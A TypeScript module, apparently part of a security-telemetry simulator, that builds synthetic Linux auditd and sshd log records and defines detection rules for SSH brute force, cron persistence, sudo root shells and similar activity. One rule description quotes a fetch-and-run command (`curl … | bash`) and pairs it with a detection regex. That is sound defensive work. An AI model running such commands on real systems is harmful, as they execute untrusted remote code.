/**
 * Linux auditd (+ sshd auth lines) — native module (card: docs/log-schemas/host-linux-auditd.md).
 *
 * Record: ONE audit record as a FLAT object keyed by the audit field names (`type`,
 * `audit_id` = the `audit(<epoch>.<ms>:<serial>)` stamp, `epoch`, `serial`, then the
 * record's own fields; USER_* inner `msg='…'` sub-fields flattened). Fields that auditd
 * hex-encodes (args / exe / cmd / proctitle with spaces, quotes or special characters)
 * stay hex, upper-case, with the card's `*_decoded` convenience key beside them.
 * `rawLine` = the `type=… msg=audit(…): …` line rebuilt from the same values. sshd auth
 * messages are their own syslog-shaped kind ("sshd"), never folded into audit fields.
 *
 * One platform event → the ONE record that carries its evidence: an exec → EXECVE (argv),
 * a sudo → USER_CMD, a file write (e.g. crontab) → PATH, an SSH auth → the authored
 * USER_AUTH / USER_LOGIN record or the sshd line, other syscalls → SYSCALL. (A real audit
 * event is a group of records sharing `audit_id`; see the final report — the contract
 * returns one NativeLog per event.)
 */
import type { NativeSource, NativeLog, KindSchema, UseCase, NativeCtx } from "../types";
import type { TelemetryEvent } from "@/lib/sim/types";
import { syslogStamp } from "./_dnsShared";

// node= is written when auditd runs with name_format=hostname — the standard setting for a
// fleet forwarding to a SIEM, and the only place an audit record names its own machine.
const STAMP = ["type", "audit_id", "epoch", "serial"];
const ARGS = Array.from({ length: 20 }, (_, i) => [`a${i}`, `a${i}_decoded`]).flat();
const USER_MSG = ["pid", "uid", "auid", "ses", "op", "exe", "hostname", "addr", "terminal", "res"];
const userKind = (): KindSchema => ({ required: [...STAMP, ...USER_MSG], optional: ["acct", "id", "raw"] });

const kinds: Record<string, KindSchema> = {
  SYSCALL: {
    required: [...STAMP, "arch", "syscall", "success", "exit", "ppid", "pid", "auid", "uid", "gid", "euid", "tty", "ses", "comm", "exe", "subj", "key"],
    optional: ["a0", "a1", "a2", "a3", "items", "suid", "fsuid", "egid", "sgid", "fsgid", "raw"],
  },
  EXECVE: { required: [...STAMP, "argc", "a0"], optional: [...ARGS.filter(a => a !== "a0"), "raw"] },
  CWD: { required: [...STAMP, "cwd"], optional: ["raw"] },
  PATH: { required: [...STAMP, "item", "name", "inode", "dev", "mode", "ouid", "ogid", "rdev", "objtype"], optional: ["key", "raw"] },
  PROCTITLE: { required: [...STAMP, "proctitle"], optional: ["proctitle_decoded", "raw"] },
  USER_CMD: { required: [...STAMP, "pid", "uid", "auid", "ses", "cwd", "cmd", "terminal", "res"], optional: ["cmd_decoded", "op", "raw"] },
  USER_AUTH: userKind(), USER_ACCT: userKind(), USER_LOGIN: userKind(), CRED_ACQ: userKind(), USER_START: userKind(), CRED_DISP: userKind(),
  // sshd syslog line (authpriv), kept separate from auditd records.
  sshd: { required: ["timestamp", "hostname", "program", "pid", "message"], optional: ["raw"] },
};
for (const k of Object.values(kinds)) if (!k.optional?.includes("node")) k.optional = [...(k.optional ?? []), "node"];   // name_format=hostname

export function kindOf(record: Record<string, unknown>): string | null {
  if (typeof record.type === "string" && kinds[record.type] && "audit_id" in record) return record.type;
  if (record.program === "sshd" && "message" in record) return "sshd";
  return null;
}

// ── helpers ──────────────────────────────────────────────────────────────────
const str = (v: unknown): string | undefined =>
  v === undefined || v === null || v === "" ? undefined : Array.isArray(v) ? (v.length ? v.map(String).join(" ") : undefined) : String(v);
const UNSET = "4294967295";
const SYSCALLS: Record<string, string> = { execve: "59", open: "2", openat: "257", connect: "42", chmod: "90", fchmodat: "268", unlink: "87", unlinkat: "263", sendto: "44", rename: "82", write: "1", setuid: "105" };
const SHELLS = /^(\/usr)?\/bin\/(ba|da|z|k)?sh$|^(ba|da|z|k)?sh$/;

/** auditd hex-encodes a value that contains a space, quote, backslash, control or non-ASCII char. */
const needsHex = (v: string) => /[\s"'\\]|[^\x21-\x7e]/.test(v);
// TextEncoder/TextDecoder (not Buffer) so the module also runs in the browser bundle.
const toHex = (v: string) => Array.from(new TextEncoder().encode(v), b => b.toString(16).padStart(2, "0")).join("").toUpperCase();
const fromHex = (v: string) => new TextDecoder().decode(Uint8Array.from((v.match(/../g) ?? []).map(h => parseInt(h, 16))));
const isHex = (v: string) => /^[0-9A-Fa-f]+$/.test(v) && v.length % 2 === 0 && v.length >= 4 && /^[\x20-\x7e\0]+$/.test(fromHex(v));

/** Shell-style split honouring single/double quotes. */
function shellSplit(cmd: string): string[] {
  const out: string[] = [];
  let cur = "", q: string | null = null, has = false;
  for (const ch of cmd) {
    if (q) { if (ch === q) q = null; else cur += ch; continue; }
    if (ch === "'" || ch === '"') { q = ch; has = true; continue; }
    if (/\s/.test(ch)) { if (cur || has) out.push(cur); cur = ""; has = false; continue; }
    cur += ch;
  }
  if (cur || has) out.push(cur);
  return out;
}
/** True when the command line has shell operators outside quotes (|, &&, ;, >, <). */
function hasShellOps(cmd: string): boolean {
  let q: string | null = null;
  for (const ch of cmd) {
    if (q) { if (ch === q) q = null; continue; }
    if (ch === "'" || ch === '"') { q = ch; continue; }
    if ("|;&<>".includes(ch)) return true;
  }
  return false;
}
function parseMsg(msg?: string): Record<string, string> {
  const out: Record<string, string> = {};
  if (!msg) return out;
  for (const m of msg.matchAll(/(\w+)=("([^"]*)"|\S+)/g)) out[m[1]] = m[3] ?? m[2];
  return out;
}

function fromTelemetry(ev: TelemetryEvent, ctx: NativeCtx): NativeLog | null {
  const raw = ev.raw ?? {};
  const r = (k: string) => str(raw[k]);
  const ag = (k: string) => r(`data.audit.${k}`) ?? r(`audit.${k}`) ?? r(`auditd.log.${k}`);
  const msgKv = parseMsg(r("audit.msg"));
  const hint = (ag("type") ?? r("auditd.log.record_type"))?.toUpperCase();
  const host = ev.hostname ?? r("host.hostname") ?? r("host.name");
  if (!host) return null;
  const timeMs = Date.parse(ev.ts);
  const epoch = (timeMs / 1000).toFixed(3);
  const serial = String(ctx.int(`${ctx.companyId}:${host}:serialbase`, 100_000, 800_000) + (Math.floor(timeMs / 1000) % 1_000_000));
  const stamp = { type: "", audit_id: `audit(${epoch}:${serial})`, epoch, serial };
  const email = ev.user_email ?? ev.user?.email;

  const userName = ag("acct") ?? msgKv.acct ?? r("data.dstuser") ?? r("data.srcuser") ?? r("sshd.user") ?? r("user.name") ?? ev.process?.user ?? r("process.user") ?? (email ? email.split("@")[0] : undefined);
  const uidFor = (n?: string) => (!n ? undefined : n === "root" ? "0" : String(1000 + ctx.int(`${ctx.companyId}:${host}:uid:${n}`, 1, 80)));
  const srcIp = r("data.srcip") ?? r("sshd.client_ip") ?? r("source.ip") ?? ag("addr") ?? ev.src_ip;
  const srcPort = r("data.srcport") ?? r("sshd.client_port") ?? r("source.port") ?? (ev.src_port !== undefined ? String(ev.src_port) : undefined);
  const success = !/fail|denied|invalid/i.test(`${ag("res") ?? msgKv.res ?? ""} ${r("event.outcome") ?? ""} ${ev.authentication?.result ?? ""} ${r("sshd.event") ?? ""}`) && !/_failed|failure/.test(ev.event_type);
  const pidOf = () => ag("pid") ?? r("process.pid") ?? (ev.process?.pid !== undefined ? String(ev.process.pid) : undefined) ?? String(ctx.int(`${ev.id}:pid`, 1000, 60000));

  // ── decide the record ──
  const sshdish = r("log.source") === "sshd" || r("sshd.event") !== undefined;
  const nonAudit = !hint && !sshdish && (r("log.source") !== undefined && r("log.source") !== "auditd");
  const USER_TYPES = new Set(["USER_AUTH", "USER_ACCT", "USER_LOGIN", "CRED_ACQ", "USER_START", "CRED_DISP", "USER_CMD"]);
  const filePath = ev.file?.path ?? ag("file.name") ?? r("file.path");
  const cmdline = ev.process?.cmdline;
  const rawArgs: string[] = [];
  for (let i = 0; i < 20; i++) { const v = r(`data.audit.execve.a${i}`) ?? r(`audit.a${i}`); if (v === undefined) break; rawArgs.push(v); }
  const pargs = raw["process.args"];
  let kind: string | null = null;
  if (sshdish || (!hint && ["ssh_login", "ssh_failed", "auth_success", "auth_failure"].includes(ev.event_type) && srcIp)) kind = "sshd";
  else if (nonAudit) kind = null;
  else if (hint && USER_TYPES.has(hint)) kind = hint;
  else if (filePath && (ev.event_type.startsWith("file_") || ev.event_type === "linux_cron" || ev.event_type === "account_modify") && filePath.startsWith("/")) kind = "PATH";
  else if (hint === "SOCKADDR" || ev.event_type === "net_connection") kind = "SYSCALL";
  else if (hint === "PROCTITLE") kind = "PROCTITLE";
  else if ((cmdline || rawArgs.length || pargs !== undefined) && (!hint || hint === "EXECVE" || (hint === "SYSCALL" && /^(59|execve)$/.test(ag("syscall") ?? "")) )) kind = "EXECVE";
  else if (hint === "SYSCALL" || hint === "EXECVE") kind = "SYSCALL";
  else if (["sudo_command", "linux_priv_change"].includes(ev.event_type)) kind = "USER_CMD";
  if (!kind) return null; // cron / systemd / fail2ban syslog, CONFIG_CHANGE, SERVICE_START … are not records this card documents

  const out = (record: Record<string, unknown>, rawLine: string): NativeLog => ({ sourceId: "linux_auditd", kind: kind!, format: "kv", record, rawLine, timeMs });
  const head = (type: string) => ({ ...(host ? { node: host } : {}), ...stamp, type });
  const line = (type: string, body: string) => `${host ? `node=${host} ` : ""}type=${type} msg=${stamp.audit_id}: ${body}`;
  const q = (v: string) => `"${v}"`;

  if (kind === "sshd") {
    const user = userName ?? "unknown";
    const ip = srcIp ?? "?";
    const port = srcPort ?? String(ctx.int(`${ev.id}:sport`, 32768, 60999));
    const method = (r("system.auth.ssh.method") ?? r("sshd.auth_method") ?? r("sshd.method") ?? ev.authentication?.method ?? "password").toLowerCase().includes("key") ? "publickey" : "password";
    const evName = r("sshd.event") ?? r("system.auth.ssh.event");
    const fp = r("sshd.key_fingerprint") ?? r("sshd.fingerprint");
    let message: string;
    if (evName && /^Disconnected/i.test(evName)) message = `Disconnected from user ${user} ${ip} port ${port}`;
    else if (success) message = `Accepted ${method} for ${user} from ${ip} port ${port} ssh2${method === "publickey" && fp ? `: RSA ${fp}` : ""}`;
    else message = `Failed ${method} for ${user} from ${ip} port ${port} ssh2`;
    const pid = r("process.pid") ?? ag("pid") ?? String(ctx.int(`${ev.id}:sshdpid`, 1000, 60000));
    const timestamp = syslogStamp(timeMs, ctx.companyId);
    return out({ timestamp, hostname: host, program: "sshd", pid, message }, `<38>${timestamp} ${host} sshd[${pid}]: ${message}`);
  }

  if (kind === "USER_CMD") {
    let cmd = ag("cmd") ?? r("sudo.command") ?? (cmdline ? cmdline.replace(/^sudo\s+(-\S+\s+)*/, "") : undefined) ?? "";
    const decoded = isHex(cmd) ? fromHex(cmd) : cmd;
    cmd = isHex(cmd) ? cmd.toUpperCase() : toHex(cmd);
    const uid = ag("uid") ?? uidFor(userName) ?? "1000";
    const auid = ag("auid") ?? uid;
    const ses = ag("ses") ?? String(ctx.int(`${ctx.companyId}:${host}:ses:${auid}`, 2, 5000));
    const cwd = ag("cwd") ?? (userName && userName !== "root" ? `/home/${userName}` : "/root");
    const terminal = ag("terminal") ?? ag("tty") ?? "pts/0";
    const res = success ? "success" : "failed";
    const pid = pidOf();
    const record = { ...head("USER_CMD"), pid, uid, auid, ses, cwd, cmd, cmd_decoded: decoded, terminal, res };
    return out(record, line("USER_CMD", `pid=${pid} uid=${uid} auid=${auid} ses=${ses} msg='cwd=${q(cwd)} cmd=${cmd} terminal=${terminal} res=${res}'`));
  }

  if (kind !== "SYSCALL" && kind !== "EXECVE" && kind !== "PATH" && kind !== "PROCTITLE") {
    // USER_AUTH / USER_LOGIN / CRED_ACQ / USER_START / USER_ACCT / CRED_DISP
    const type = kind;
    const sshd = (ag("exe") ?? msgKv.exe ?? "/usr/sbin/sshd").includes("sshd");
    const preLogin = type === "USER_AUTH" || type === "USER_ACCT" || (type === "USER_LOGIN" && !success);
    const userUid = uidFor(userName);
    const uid = ag("uid") ?? msgKv.uid ?? (sshd ? "0" : userUid ?? "0");
    const auid = ag("auid") ?? (preLogin ? UNSET : userUid ?? UNSET);
    const ses = ag("ses") ?? (auid === UNSET ? UNSET : String(ctx.int(`${ctx.companyId}:${host}:ses:${auid}`, 2, 5000)));
    const op = ag("op") ?? msgKv.op ?? (type === "USER_AUTH" ? "PAM:authentication" : type === "USER_ACCT" ? "PAM:accounting" : type === "USER_LOGIN" ? "login" : type === "CRED_ACQ" ? "PAM:setcred" : type === "USER_START" ? "PAM:session_open" : "PAM:setcred");
    const exe = ag("exe") ?? msgKv.exe ?? "/usr/sbin/sshd";
    const addr = srcIp ?? "?";
    const terminal = ag("terminal") ?? msgKv.terminal ?? (type === "USER_LOGIN" && success ? `/dev/pts/${ctx.int(`${ev.id}:pts`, 0, 5)}` : sshd ? "ssh" : "/dev/pts/0");
    const hostname = type === "USER_LOGIN" && success ? addr : "?";
    const res = success ? "success" : "failed";
    const pid = pidOf();
    const loginId = type === "USER_LOGIN" && success && auid !== UNSET ? auid : undefined;
    const record: Record<string, unknown> = { ...head(type), pid, uid, auid, ses, op, ...(loginId ? { id: loginId } : { acct: userName ?? "?" }), exe, hostname, addr, terminal, res };
    const who = loginId ? `id=${loginId}` : `acct=${q(userName ?? "?")}`;
    return out(record, line(type, `pid=${pid} uid=${uid} auid=${auid} ses=${ses} msg='op=${op} ${who} exe=${q(exe)} hostname=${hostname} addr=${addr} terminal=${terminal} res=${res}'`));
  }

  // ── process identity shared by SYSCALL / EXECVE / PATH / PROCTITLE ──
  const exe = ag("exe") ?? ev.process?.path ?? r("process.executable") ?? (ev.process?.name ? `/usr/bin/${ev.process.name}` : undefined);
  const uid = ag("uid") ?? uidFor(ev.process?.user ?? userName) ?? "0";
  const auid = ag("auid") ?? uid;

  if (kind === "PATH") {
    const name = filePath!;
    const fm = ag("file.mode") ?? r("file.mode");
    const mode = fm ? (fm.length <= 4 ? `0100${fm.replace(/^0/, "").padStart(3, "0")}` : fm) : "0100644";
    const ouid = ag("file.ouid") ?? uid;
    const ogid = ag("file.ogid") ?? ag("gid") ?? ouid;
    const objtype = ag("file.nametype") ?? (ev.event_type === "file_delete" ? "DELETE" : ev.event_type === "file_create" || ev.event_type === "linux_cron" ? "CREATE" : "NORMAL");
    const inode = String(ctx.int(`${ctx.companyId}:${host}:inode:${name}`, 100_000, 9_999_999));
    const key = ag("key");
    const record = { ...head("PATH"), item: "0", name, inode, dev: "fd:00", mode, ouid, ogid, rdev: "00:00", objtype, ...(key ? { key } : {}) };
    const nm = needsHex(name) ? toHex(name) : q(name);
    return out(record, line("PATH", `item=0 name=${nm} inode=${inode} dev=fd:00 mode=${mode} ouid=${ouid} ogid=${ogid} rdev=00:00 objtype=${objtype}`));
  }

  // argv
  let argv: string[] = [];
  if (kind === "PROCTITLE" && r("audit.proctitle")) argv = shellSplit(r("audit.proctitle")!);
  else if (cmdline) {
    const split = shellSplit(cmdline);
    argv = hasShellOps(cmdline) && !SHELLS.test(split[0] ?? "") ? ["/bin/sh", "-c", cmdline] : split;
  } else if (rawArgs.length) argv = rawArgs;
  else if (Array.isArray(pargs)) argv = pargs.map(String);
  else if (typeof pargs === "string") argv = [ev.process?.name ?? (exe ? exe.split("/").pop()! : "sh"), ...shellSplit(pargs)];
  else if (r("audit.proctitle")) argv = shellSplit(r("audit.proctitle")!);

  if (kind === "EXECVE") {
    if (!argv.length) return null;
    const record: Record<string, unknown> = { ...head("EXECVE"), argc: String(argv.length) };
    const parts: string[] = [];
    argv.slice(0, 20).forEach((a, i) => {
      if (needsHex(a)) { const h = toHex(a); record[`a${i}`] = h; record[`a${i}_decoded`] = a; parts.push(`a${i}=${h}`); }
      else { record[`a${i}`] = a; parts.push(`a${i}=${q(a)}`); }
    });
    return out(record, line("EXECVE", `argc=${argv.length} ${parts.join(" ")}`));
  }

  if (kind === "PROCTITLE") {
    if (!argv.length) return null;
    const joined = argv.join("\0");
    const plain = argv.length === 1 && !needsHex(argv[0]);
    const proctitle = plain ? argv[0] : toHex(joined);
    const record = { ...head("PROCTITLE"), proctitle, ...(plain ? {} : { proctitle_decoded: argv.join(" ") }) };
    return out(record, line("PROCTITLE", `proctitle=${plain ? q(proctitle) : proctitle}`));
  }

  // SYSCALL
  if (!exe) return null;
  const scRaw = ag("syscall") ?? (kind === "SYSCALL" && (hint === "SOCKADDR" || ev.event_type === "net_connection") ? "connect" : "execve");
  const syscall = /^\d+$/.test(scRaw) ? scRaw : SYSCALLS[scRaw] ?? "59";
  const pid = pidOf();
  const ppid = ag("ppid") ?? r("process.ppid") ?? (ev.process?.parent_pid !== undefined ? String(ev.process.parent_pid) : undefined) ?? String(ctx.int(`${ev.id}:ppid`, 1, 60000));
  const gid = ag("gid") ?? uid;
  const comm = (ag("comm") ?? exe.split("/").pop() ?? "").slice(0, 15);
  const key = ag("key") ?? "(null)";
  const tty = ag("tty") ?? "(none)";
  const ses = ag("ses") ?? (auid === UNSET ? UNSET : String(ctx.int(`${ctx.companyId}:${host}:ses:${auid}`, 2, 5000)));
  const succ = (ag("success") ?? (success ? "yes" : "no"));
  const exit = ag("exit") ?? (succ === "yes" ? (syscall === "2" || syscall === "257" ? "3" : "0") : "-13");
  const items = syscall === "59" ? "2" : syscall === "42" ? "0" : "1";
  const addr = (k: string) => hx(ctx, `${ev.id}:${k}`, 12).replace(/^./, "5");
  const record: Record<string, unknown> = {
    ...head("SYSCALL"), arch: ag("arch") ?? "c000003e", syscall, success: succ, exit,
    a0: addr("a0"), a1: addr("a1"), a2: addr("a2"), a3: addr("a3"), items,
    ppid, pid, auid, uid, gid, euid: ag("euid") ?? uid, suid: ag("suid") ?? uid, fsuid: ag("fsuid") ?? uid,
    egid: ag("egid") ?? gid, sgid: ag("sgid") ?? gid, fsgid: ag("fsgid") ?? gid,
    tty, ses, comm, exe, subj: "unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023", key,
  };
  const ex = needsHex(exe) ? toHex(exe) : q(exe);
  const body = ["arch", "syscall", "success", "exit", "a0", "a1", "a2", "a3", "items", "ppid", "pid", "auid", "uid", "gid", "euid", "suid", "fsuid", "egid", "sgid", "fsgid", "tty", "ses"].map(k => `${k}=${record[k]}`).join(" ");
  return out(record, line("SYSCALL", `${body} comm=${q(comm)} exe=${ex} subj=${record.subj} key=${key === "(null)" ? key : q(key)}`));
}
function hx(ctx: NativeCtx, seed: string, len: number): string {
  let s = "";
  for (let i = 0; s.length < len; i++) s += ctx.hex(`${i}|${seed}`, 8);
  return s.slice(0, len);
}

// ── use cases ────────────────────────────────────────────────────────────────
const ARGV_FIELDS = Array.from({ length: 10 }, (_, i) => [`a${i}`, `a${i}_decoded`]).flat();
const PIPE_TO_SHELL = "(curl|wget)\\s[^|]*\\|\\s*(sudo\\s+)?(/usr)?(/bin/)?(ba|da|z|k)?sh\\b";
const PRIVATE = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"];

const useCases: UseCase[] = [
  {
    id: "linux_auditd.curl_pipe_shell", title: "Download piped straight into a shell (curl|wget … | sh)", sourceId: "linux_auditd", kinds: ["EXECVE", "PROCTITLE"],
    severity: "high", mitre: ["T1059.004", "T1105"],
    description: "`curl -fsSL http://x/i.sh | bash` fetches and runs code in one step, leaving nothing on disk to scan. auditd records it as an EXECVE of `bash -c` whose argument is hex-encoded (it contains spaces and a pipe) — decode a2 to read it, then pivot the URL host to proxy/DNS/firewall.",
    logic: "SPL: index=linux sourcetype=linux:audit type=EXECVE | eval cmd=coalesce(a2_decoded,a1_decoded,a2,a1) | regex cmd=\"(curl|wget)\\s[^|]*\\|\\s*(ba|da|z)?sh\"",
    match: { any: [...ARGV_FIELDS.map(f => ({ field: f, op: "regex" as const, value: PIPE_TO_SHELL })), { field: "proctitle_decoded", op: "regex", value: PIPE_TO_SHELL }] },
    falsePositives: ["Documented vendor installers (e.g. get.docker.com) run by admins — confirm a change ticket"],
  },
  {
    id: "linux_auditd.ssh_bruteforce", title: "SSH brute force: repeated PAM authentication failures from one address", sourceId: "linux_auditd", kinds: ["USER_AUTH"],
    severity: "high", mitre: ["T1110.001", "T1110.003"],
    description: "Each failed SSH password is a USER_AUTH record with res=failed, exe=/usr/sbin/sshd and the attacker in addr (auid is still unset — nobody is logged in yet). Five or more from one addr in 10 minutes is guessing; check whether the same addr later gets res=success / USER_LOGIN.",
    logic: "SPL: index=linux sourcetype=linux:audit type=USER_AUTH exe=\"/usr/sbin/sshd\" res=failed | bin _time span=10m | stats count dc(acct) by addr, _time | where count >= 5",
    match: { all: [{ field: "res", op: "eq", value: "failed" }, { field: "exe", op: "eq", value: "/usr/sbin/sshd" }] },
    threshold: { groupBy: ["addr"], count: 5, windowSec: 600 },
    falsePositives: ["A user with a saved old password retrying", "Vulnerability scanners in an authorised window"],
  },
  {
    id: "linux_auditd.ssh_success_after_failures", title: "Failed then successful SSH logon from the same address", sourceId: "linux_auditd", kinds: ["USER_AUTH", "USER_LOGIN"],
    severity: "high", mitre: ["T1110.001", "T1078"],
    description: "The breach moment of a brute force: the same addr that produced res=failed USER_AUTH records gets res=success within the window. Everything after it under the new session id (ses) is attacker activity — follow that ses through EXECVE/USER_CMD.",
    logic: "SPL: index=linux sourcetype=linux:audit (type=USER_AUTH OR type=USER_LOGIN) exe=\"/usr/sbin/sshd\" | bin _time span=30m | stats dc(res) as outcomes values(res) by addr, _time | where outcomes >= 2",
    match: { all: [{ field: "exe", op: "eq", value: "/usr/sbin/sshd" }, { field: "addr", op: "neq", value: "?" }] },
    threshold: { groupBy: ["addr"], count: 2, windowSec: 1800, distinct: "res" },
    falsePositives: ["A user mistyping then logging in correctly (usually 1–2 failures from a corporate address)"],
  },
  {
    id: "linux_auditd.root_login_external", title: "Successful root SSH authentication from a public address", sourceId: "linux_auditd", kinds: ["USER_AUTH", "USER_LOGIN"],
    severity: "high", mitre: ["T1078.003", "T1021.004"],
    description: "Direct root logins over SSH should be disabled (PermitRootLogin no); a res=success for acct=root from a non-RFC1918 addr means the root password or key is in an outsider's hands, or the server is exposed.",
    logic: "SPL: index=linux sourcetype=linux:audit (type=USER_AUTH OR type=USER_LOGIN) res=success (acct=root OR id=0) | where NOT cidrmatch(\"10.0.0.0/8\",addr) AND NOT cidrmatch(\"172.16.0.0/12\",addr) AND NOT cidrmatch(\"192.168.0.0/16\",addr)",
    match: { all: [{ field: "res", op: "eq", value: "success" }, { any: [{ field: "acct", op: "eq", value: "root" }, { field: "id", op: "eq", value: "0" }] }, { field: "addr", op: "notCidr", value: PRIVATE }] },
    falsePositives: ["Break-glass access from a provider network — should come with a ticket"],
  },
  {
    id: "linux_auditd.crontab_persistence", title: "Crontab created or edited (cron persistence)", sourceId: "linux_auditd", kinds: ["PATH", "EXECVE"],
    severity: "medium", mitre: ["T1053.003"],
    description: "A write to /var/spool/cron/<user> (PATH objtype=CREATE) or /etc/cron.*, or running `crontab -e` / `crontab -`, installs a job that survives reboot. Read the new crontab and compare with the user's normal duties.",
    logic: "SPL: index=linux sourcetype=linux:audit ((type=PATH name=\"/var/spool/cron/*\" OR name=\"/etc/cron*\") OR (type=EXECVE a0=crontab))",
    match: { any: [{ field: "name", op: "regex", value: "^/(var/spool/cron|etc/cron)" }, { all: [{ field: "a0", op: "regex", value: "(^|/)crontab$" }, { field: "a1", op: "in", value: ["-e", "-", "-r"] }] }] },
    falsePositives: ["Config management (Ansible/Puppet) deploying cron jobs", "Admins editing their own crontab"],
  },
  {
    id: "linux_auditd.sudo_failed", title: "sudo attempt denied", sourceId: "linux_auditd", kinds: ["USER_CMD"],
    severity: "medium", mitre: ["T1548.003", "T1033"],
    description: "USER_CMD res=failed: someone ran sudo and was refused (not in sudoers, wrong password, or `sudo -l` probing what they may run). Right after a fresh SSH session this is privilege-escalation reconnaissance; decode cmd to see what was attempted.",
    logic: "SPL: index=linux sourcetype=linux:audit type=USER_CMD res=failed | eval cmd=coalesce(cmd_decoded, cmd) | stats count values(cmd) by auid, ses",
    match: { all: [{ field: "type", op: "eq", value: "USER_CMD" }, { field: "res", op: "eq", value: "failed" }] },
    falsePositives: ["Users mistyping their password"],
  },
  {
    id: "linux_auditd.sudo_root_shell", title: "sudo used to open a root shell", sourceId: "linux_auditd", kinds: ["USER_CMD"],
    severity: "medium", mitre: ["T1548.003"],
    description: "`sudo -i`, `sudo su` or `sudo bash` gives an interactive root shell, after which individual commands are no longer attributed by sudo. Compare auid with the list of people expected to administer the box.",
    logic: "SPL: index=linux sourcetype=linux:audit type=USER_CMD res=success | regex cmd_decoded=\"^((/usr)?/bin/)?(ba|z|da)?sh$|^su(\\s|$)\"",
    match: { all: [{ field: "res", op: "eq", value: "success" }, { field: "cmd_decoded", op: "regex", value: "^((/usr)?/bin/)?((ba|z|da)?sh|su)(\\s|$)" }] },
    falsePositives: ["Named administrators doing routine maintenance"],
  },
  {
    id: "linux_auditd.sudo_to_root_session", title: "Human account became root through sudo (context)", sourceId: "linux_auditd", kinds: ["CRED_ACQ", "USER_START"],
    severity: "low", mitre: ["T1548.003"],
    description: "CRED_ACQ / USER_START with acct=root, exe=/usr/bin/sudo and a non-zero auid record the moment a logged-in human obtained root. auid keeps the original user even after sudo, so this is the record that names who became root — baseline it per host and flag unusual auids (service accounts, new hires).",
    logic: "SPL: index=linux sourcetype=linux:audit (type=CRED_ACQ OR type=USER_START) acct=root exe=\"/usr/bin/sudo\" auid!=0 auid!=4294967295 | stats count by host, auid",
    match: { all: [{ field: "acct", op: "eq", value: "root" }, { field: "exe", op: "eq", value: "/usr/bin/sudo" }, { field: "auid", op: "nin", value: ["0", UNSET] }] },
    falsePositives: ["Every legitimate sudo produces this — it is context for other alerts, not an alert on its own"],
  },
  {
    id: "linux_auditd.hidden_dir_executable", title: "Executable file in a hidden directory", sourceId: "linux_auditd", kinds: ["PATH"],
    severity: "medium", mitre: ["T1564.001", "T1036.005"],
    description: "Backdoors and implants hide in dot-directories (~/.cache/.fontconfig/kworker) and borrow kernel-thread names. A PATH record with an executable mode (0100755 / 0100700) under a path component starting with a dot deserves a hash lookup and a look at what runs it.",
    logic: "SPL: index=linux sourcetype=linux:audit type=PATH | regex name=\"/\\.[^/]+/\" | regex mode=\"^0100[57]\"",
    match: { all: [{ field: "name", op: "regex", value: "/\\.[^/]+/[^/]+$" }, { field: "mode", op: "regex", value: "^0100[57][0-7][0-7]$" }] },
    falsePositives: ["Developer tool caches (~/.npm, ~/.cargo/bin) — allow-list known paths"],
  },
  {
    id: "linux_auditd.sshd_failed_burst", title: "Burst of sshd 'Failed password' lines on one server", sourceId: "linux_auditd", kinds: ["sshd"],
    severity: "medium", mitre: ["T1110.001"],
    description: "The sshd auth log (separate from auditd) prints `Failed password for [invalid user] X from IP port P`. Many on one server within minutes is password guessing; `invalid user` means the attacker is spraying account names that do not exist.",
    logic: "SPL: index=linux sourcetype=linux_secure \"Failed password\" | rex \"from (?<src>\\S+) port\" | bin _time span=10m | stats count dc(src) by host, _time | where count >= 5",
    match: { field: "message", op: "regex", value: "^Failed (password|publickey) for " },
    threshold: { groupBy: ["hostname"], count: 5, windowSec: 600 },
    falsePositives: ["Monitoring probes with expired credentials"],
  },
];

export const source: NativeSource = {
  schema: {
    sourceId: "linux_auditd", category: "host_telemetry", card: "host-linux-auditd.md", product: "Linux auditd",
    format: "kv", vendorMatch: ["auditd", "linux audit"], telemetrySources: ["linux_audit"], kinds,
  },
  fromTelemetry,
  useCases,
};
